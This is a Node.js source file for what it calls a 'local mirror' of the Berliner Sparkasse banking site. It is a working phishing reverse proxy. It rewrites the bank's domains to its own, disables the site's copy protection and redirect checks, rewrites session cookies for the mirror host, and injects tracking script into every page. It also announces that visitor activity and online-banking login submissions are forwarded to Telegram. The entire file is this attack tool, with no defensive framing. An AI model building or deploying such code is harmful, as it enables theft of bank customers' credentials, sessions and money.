/**
 * Local mirror of https://www.berliner-sparkasse.de
 * Full-site reverse proxy with copy-protection bypass and static asset cache.
 */
import './lib/env.mjs';
import http from 'node:http';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { Readable } from 'node:stream';
import { WebSocketServer, WebSocket } from 'ws';
import { Agent, fetch as undiciFetch, setGlobalDispatcher } from 'undici';
import { handleApiRequest } from './api/gateway.mjs';
import { isVisitorPageRequest, notifyNewVisitor } from './api/visitor-notify.mjs';
import { fixCopyProtection } from './lib/copy-protection.mjs';
import {
  cacheStats,
  getCached,
  getInflight,
  htmlCacheKey,
  isCacheable,
  setCached,
  setInflight,
} from './lib/cache.mjs';
import { prewarmMirror } from './lib/prewarm.mjs';
import {
  copyResponseHeaders,
  createRewriter,
  isHtmlContentType,
  localOrigin,
  mirrorHostname,
  rewriteLocation,
  rewriteSetCookie,
} from './lib/rewrite.mjs';

setGlobalDispatcher(
  new Agent({
    connections: 128,
    pipelining: 1,
    keepAliveTimeout: 120_000,
    keepAliveMaxTimeout: 180_000,
  }),
);

const PORT = Number(process.env.PORT) || 5180;
const UPSTREAM = (process.env.BSK_UPSTREAM || 'https://www.berliner-sparkasse.de').replace(
  /\/$/,
  '',
);
const MODULE = (process.env.BSK_MODULE || 'https://module.berliner-sparkasse.de').replace(
  /\/$/,
  '',
);
const SPARKASSE = (process.env.BSK_SPARKASSE || 'https://www.sparkasse.de').replace(/\/$/, '');
const HOME_PATH = process.env.BSK_HOME || '/de/home.html?n=true&stref=logo';
const LOG = process.env.BSK_LOG !== '0';

const REWRITE_HOSTS = [
  { from: UPSTREAM, to: '' },
  { from: UPSTREAM.replace('https://', 'http://'), to: '' },
  { from: MODULE, to: '/__module' },
  { from: MODULE.replace('https://', 'http://'), to: '/__module' },
  { from: SPARKASSE, to: '/__sparkasse' },
  { from: SPARKASSE.replace('https://', 'http://'), to: '/__sparkasse' },
];

const HTML_CACHE_TTL = Number(process.env.BSK_HTML_CACHE_TTL_MS) || 5 * 60 * 1000;
const PREWARM = process.env.BSK_PREWARM !== '0';

const SHIM = `<script id="bsk-local-shim">(function(){var O=location.origin,H=[{from:"${UPSTREAM}",to:""},{from:"${MODULE}",to:"/__module"},{from:"${SPARKASSE}",to:"/__sparkasse"}];function rw(u){if(typeof u!=="string")return u;var i;for(i=0;i<H.length;i++){var h=H[i];if(u.indexOf(h.from)===0)return O+h.to+u.slice(h.from.length)}return u}var f=window.fetch;window.fetch=function(i,n){var u=typeof i==="string"?i:i.url;u=rw(u);if(u!==(typeof i==="string"?i:i.url))i=typeof i==="string"?u:new Request(u,i);return f.call(this,i,n)};var X=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){return X.call(this,m,rw(String(u)),arguments[2],arguments[3],arguments[4])};var Ow=window.WebSocket;window.WebSocket=function(u,p){return new Ow(rw(String(u)),p)};window.WebSocket.prototype=Ow.prototype})();</script>`;

const CP_BLOCK = `<script id="bsk-cp-block">(function(){var B=/nonexistent/i;function bad(u){return typeof u==="string"&&B.test(u)}var a=location.assign.bind(location);location.assign=function(u){if(bad(u))return;return a(u)};var r=location.replace.bind(location);location.replace=function(u){if(bad(u))return;return r(u)};try{var d=Object.getOwnPropertyDescriptor(Location.prototype,"href");if(d&&d.set){var s=d.set;Object.defineProperty(location,"href",{configurable:true,set:function(v){if(bad(v))return;return s.call(location,v)},get:function(){return d.get.call(location)}})}}catch(e){}})();</script>`;

const TRACK_SCRIPT =
  '<script>window.addEventListener("load",function(){var s=document.createElement("script");s.src="/api/track.js";s.defer=true;document.body.appendChild(s)},{once:true});</script>';

function log(...args) {
  if (LOG) console.log(...args);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

function resolveUpstream(url) {
  const path = url.pathname;
  const search = url.search;

  if (path.startsWith('/__module/') || path === '/__module') {
    const rest = path.slice('/__module'.length) || '/';
    return `${MODULE}${rest}${search}`;
  }
  if (path.startsWith('/__sparkasse/') || path === '/__sparkasse') {
    const rest = path.slice('/__sparkasse'.length) || '/';
    return `${SPARKASSE}${rest}${search}`;
  }
  if (path === '/' || path === '') {
    return `${UPSTREAM}${HOME_PATH.startsWith('/') ? HOME_PATH : `/${HOME_PATH}`}`;
  }
  return `${UPSTREAM}${path}${search}`;
}

function upstreamHeaders(req, targetUrl, { rewriteHtml = false, identity = false } = {}) {
  const url = new URL(targetUrl);
  const h = {
    'accept-language': req.headers['accept-language'] || 'de-DE,de;q=0.9,en;q=0.8',
    'user-agent':
      req.headers['user-agent'] ||
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    host: url.host,
    origin: UPSTREAM,
    referer: `${UPSTREAM}${url.pathname}`,
  };

  if (rewriteHtml) {
    h['accept-encoding'] = 'gzip, deflate, br';
  } else if (identity) {
    h['accept-encoding'] = 'identity';
  } else if (req.headers['accept-encoding']) {
    h['accept-encoding'] = req.headers['accept-encoding'];
  }

  if (req.headers.cookie) h.cookie = req.headers.cookie;
  if (req.headers['content-type']) h['content-type'] = req.headers['content-type'];
  if (req.headers.accept) h.accept = req.headers.accept;
  if (req.headers.range) h.range = req.headers.range;
  return h;
}

function injectHtml(html, hostname) {
  html = fixCopyProtection(html, hostname);

  if (!html.includes('bsk-cp-block')) {
    html = html.includes('<head>')
      ? html.replace('<head>', `<head>${CP_BLOCK}${SHIM}`)
      : CP_BLOCK + SHIM + html;
  }

  if (!html.includes('/api/track.js')) {
    html = html.includes('</head>')
      ? html.replace('</head>', `${TRACK_SCRIPT}</head>`)
      : html + TRACK_SCRIPT;
  }

  return html;
}

function applySetCookieHeaders(resHeaders, upstream, mirrorHost) {
  const cookies = upstream.headers.getSetCookie?.() || [];
  if (cookies.length) {
    resHeaders['set-cookie'] = cookies.map((c) => rewriteSetCookie(c, mirrorHost));
  } else {
    const single = upstream.headers.get('set-cookie');
    if (single) resHeaders['set-cookie'] = rewriteSetCookie(single, mirrorHost);
  }
}

function likelyHtmlPath(pathname) {
  const ext = pathname.match(/\.([a-z0-9]+)$/i)?.[1]?.toLowerCase();
  if (!ext) return true;
  return ext === 'html' || ext === 'htm';
}

async function processHtml(upstream, hostname, origin) {
  const rewrite = createRewriter(REWRITE_HOSTS, origin);
  let html = await upstream.text();
  html = rewrite(html);
  html = injectHtml(html, hostname);
  const buf = Buffer.from(html, 'utf8');
  const ct = upstream.headers.get('content-type') || 'text/html';
  const headers = copyResponseHeaders(upstream, {
    'content-type': ct.includes('charset') ? ct : 'text/html; charset=utf-8',
    'content-length': String(buf.length),
    'cache-control': 'public, max-age=120',
  });
  delete headers['content-encoding'];
  applySetCookieHeaders(headers, upstream, hostname);
  return { body: buf, headers, status: upstream.status };
}

async function proxyHttp(req, res, targetUrl) {
  const origin = localOrigin(req, PORT);
  const hostname = mirrorHostname(req, PORT);
  const targetPath = new URL(targetUrl).pathname;
  const cacheKey = `${req.method}:${targetUrl}`;
  const expectHtml = req.method === 'GET' && likelyHtmlPath(targetPath);
  const useCache = isCacheable(targetPath, req.method);
  const htmlKey = expectHtml ? htmlCacheKey(hostname, targetUrl) : '';

  if (expectHtml) {
    const htmlHit = getCached(htmlKey);
    if (htmlHit) {
      log(`[cache] HTML HIT ${targetPath}`);
      res.writeHead(htmlHit.status, htmlHit.headers);
      res.end(htmlHit.body);
      return;
    }
    const pending = getInflight(htmlKey);
    if (pending) {
      const entry = await pending;
      res.writeHead(entry.status, entry.headers);
      res.end(entry.body);
      return;
    }
  }

  if (useCache) {
    const hit = getCached(cacheKey);
    if (hit) {
      log(`[cache] HIT ${targetPath}`);
      res.writeHead(hit.status, hit.headers);
      res.end(hit.body);
      return;
    }
  }

  const body =
    req.method !== 'GET' && req.method !== 'HEAD' ? await readBody(req) : undefined;

  const doFetch = () =>
    undiciFetch(targetUrl, {
      method: req.method,
      headers: upstreamHeaders(req, targetUrl, {
        rewriteHtml: expectHtml,
        identity: useCache,
      }),
      body: body?.length ? body : undefined,
      redirect: 'manual',
    });

  const upstream = await doFetch();

  if (upstream.status >= 300 && upstream.status < 400) {
    const loc = upstream.headers.get('location');
    if (loc) {
      res.writeHead(upstream.status, {
        location: rewriteLocation(loc, REWRITE_HOSTS, origin),
      });
      res.end();
      return;
    }
  }

  const ct = upstream.headers.get('content-type') || '';

  if (expectHtml && isHtmlContentType(ct) && req.method === 'GET') {
    const work = processHtml(upstream, hostname, origin);
    if (htmlKey) setInflight(htmlKey, work);
    const entry = await work;
    setCached(htmlKey, entry, HTML_CACHE_TTL);
    log(`[cache] HTML MISS ${targetPath}`);
    res.writeHead(entry.status, entry.headers);
    res.end(entry.body);
    return;
  }

  const headers = copyResponseHeaders(upstream);
  applySetCookieHeaders(headers, upstream, hostname);

  if (useCache && upstream.status === 200) {
    const chunks = [];
    for await (const chunk of upstream.body) {
      chunks.push(Buffer.from(chunk));
    }
    const buf = Buffer.concat(chunks);
    const cacheHeaders = copyResponseHeaders(upstream);
    delete cacheHeaders['content-encoding'];
    cacheHeaders['content-length'] = String(buf.length);
    cacheHeaders['cache-control'] = 'public, max-age=3600';
    setCached(cacheKey, { body: buf, headers: cacheHeaders, status: upstream.status });
    log(`[cache] MISS ${targetPath}`);
    res.writeHead(upstream.status, cacheHeaders);
    res.end(buf);
    return;
  }

  res.writeHead(upstream.status, headers);
  if (upstream.body) {
    Readable.fromWeb(upstream.body).pipe(res);
  } else {
    res.end();
  }
}

function isApiPath(pathname) {
  return pathname.startsWith('/api');
}

function trackVisitor(req, pathname, search = '') {
  if (!isVisitorPageRequest(pathname, req.method)) return;
  notifyNewVisitor(req, { path: pathname + search }).catch((err) => {
    console.error('[visitor]', err.message || err);
  });
}

async function handleHttp(req, res) {
  const url = new URL(req.url, `http://localhost:${PORT}`);

  trackVisitor(req, url.pathname, url.search);

  if (isApiPath(url.pathname)) {
    if (url.pathname === '/api/cache') {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify(cacheStats()));
      return;
    }
    const handled = await handleApiRequest(req, res, url.pathname);
    if (handled) return;
    res.writeHead(404, {
      'content-type': 'application/json',
      'access-control-allow-origin': '*',
    });
    res.end(JSON.stringify({ error: 'not_found', path: url.pathname }));
    return;
  }

  if (url.pathname === '/__ws') {
    res.writeHead(426);
    res.end('Use WebSocket');
    return;
  }

  const target = resolveUpstream(url);
  log(`[proxy] ${req.method} ${url.pathname}${url.search}`);
  await proxyHttp(req, res, target);
}

const server = http.createServer((req, res) => {
  handleHttp(req, res).catch((err) => {
    console.error(err);
    if (!res.headersSent) {
      res.writeHead(502);
      res.end('Proxy error');
    }
  });
});

const wss = new WebSocketServer({ noServer: true });

server.on('upgrade', (req, socket, head) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);

  let remoteUrl;
  if (url.pathname.startsWith('/__module/')) {
    const rest = url.pathname.slice('/__module'.length) || '/';
    remoteUrl = `${MODULE.replace('https://', 'wss://')}${rest}${url.search}`;
  } else {
    remoteUrl = `${UPSTREAM.replace('https://', 'wss://')}${url.pathname}${url.search}`;
  }

  wss.handleUpgrade(req, socket, head, (clientWs) => {
    log('[ws]', remoteUrl);
    const remote = new WebSocket(remoteUrl, {
      headers: upstreamHeaders(req, remoteUrl),
    });

    const closeBoth = () => {
      try {
        clientWs.close();
      } catch {
        /* ignore */
      }
      try {
        remote.close();
      } catch {
        /* ignore */
      }
    };

    clientWs.on('message', (data) => {
      if (remote.readyState === WebSocket.OPEN) remote.send(data);
    });
    remote.on('message', (data) => {
      if (clientWs.readyState === WebSocket.OPEN) clientWs.send(data);
    });

    clientWs.on('close', closeBoth);
    remote.on('close', closeBoth);
    clientWs.on('error', () => closeBoth());
    remote.on('error', () => closeBoth());
  });
});

server.listen(PORT, () => {
  console.log('');
  console.log('  Berliner Sparkasse mirror (full site)');
  console.log(`  → http://localhost:${PORT}/`);
  console.log(`  → http://localhost:${PORT}/api/health`);
  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
    console.log('  Telegram: activity + visitor logs ON');
  } else {
    console.log('  Telegram: OFF (set TELEGRAM_* in .env)');
  }
  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_LOGINS_CHAT_ID) {
    console.log('  Telegram logins: ON → login-online-banking submit');
  }
  console.log('');

  if (PREWARM) {
    prewarmMirror({
      upstream: UPSTREAM,
      homePath: HOME_PATH,
      rewriteHosts: REWRITE_HOSTS,
      port: PORT,
      injectHtml,
      log,
    }).catch((err) => console.error('[prewarm]', err.message || err));
  }
});
